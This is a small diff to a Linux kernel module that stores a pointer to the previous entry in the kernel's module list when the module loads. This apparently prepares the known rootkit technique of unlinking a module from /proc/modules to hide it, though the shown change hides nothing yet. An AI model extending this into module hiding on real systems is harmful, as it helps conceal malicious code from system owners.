@@ -20,8 +20,15 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 
+static struct list_head *prev_entry; /* Pointer to previous entry in proc/modules */
+
+static inline void memorize(void) {
+  prev_entry = THIS_MODULE->list.prev;
+}
+
 // on module load
 static int __init load_module(void) {
+  memorize(); 
   return 0;
 }
 
